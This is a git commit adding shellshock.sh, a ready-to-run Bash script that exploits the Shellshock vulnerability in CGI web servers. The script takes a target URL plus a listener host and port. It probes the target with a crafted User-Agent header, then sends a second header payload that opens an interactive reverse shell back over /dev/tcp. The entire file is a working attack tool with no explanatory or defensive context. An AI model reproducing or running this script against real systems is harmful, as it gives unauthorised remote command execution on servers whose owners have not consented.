e19049f927d185d7572eda4077fdec090468fbd0
Airán 'gurgui' Gómez <101645735+Gurguii@users.noreply.github.com>
2022-06-23 20:44:22 +0100

    Add files via upload

---
+++ shellshock.sh
@@ -0,0 +1,19 @@
+#/bin/bash
+if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
+  printf "\nUsage: bash $0 <url> <lhost> <lport>\n"
+  exit 0
+fi
+url=$1
+LHOST=$2
+LPORT=$3
+printf "[?] Testing if target is vulnerable\n"
+if [[ -z $(curl -A "() { :;}; /bin/echo 'a'" -s $url) ]]; then
+  printf "[!]Not vulnerable\n[-]Exiting...\n"
+  exit 0
+fi
+printf "[+] Target vulnerable\n"
+if [[ -z $(netstat -lt | grep $LPORT) ]]; then
+  printf "[!] You're not listening on port %s\n[+] Set it up and press enter" "$LPORT"
+  read -p ""
+fi
+curl -A "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &" -s --output /dev/null $url && printf "[!] Check your listener\n"
